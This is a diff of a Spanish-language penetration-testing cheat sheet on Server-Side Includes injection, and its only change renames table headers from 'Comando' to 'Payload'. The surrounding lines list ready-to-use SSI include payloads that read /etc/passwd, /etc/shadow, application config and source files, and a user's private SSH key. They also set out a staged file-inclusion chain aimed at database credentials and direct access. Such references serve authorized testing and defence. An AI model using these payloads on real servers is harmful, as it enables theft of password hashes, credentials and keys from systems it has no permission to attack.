@@ -21,7 +21,7 @@ linked:
 
 ## `#include virtual` (URL-Relative)
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |---|---|---|
 | `<!--#include virtual="/admin/config.php" -->` | Contenido del recurso (ejecutado si hay handler) | Path relativo al webroot |
 | `<!--#include virtual="/another.shtml" -->` | SSI recursivo (parsea el incluido) | Encadenar SSI |
@@ -39,7 +39,7 @@ linked:
 
 ## `#include file` (Filesystem-Relative)
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |---|---|---|
 | `<!--#include file="/etc/passwd" -->` | Usuarios del sistema (crudo) | Lectura directa |
 | `<!--#include file="/etc/shadow" -->` | Hashes de contraseñas | Si corre como root |
@@ -72,7 +72,7 @@ file=          Filesystem-relative
 
 ## LFI Chain via SSI
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |---|---|---|
 | `<!--#include file="/var/www/html/admin.php" -->` | Source con creds de DB / endpoints internos | Stage 1: source disclosure |
 | `<!--#include file="/home/devuser/.ssh/id_rsa" -->` | Clave SSH para acceso directo | Stage 2: si es legible |
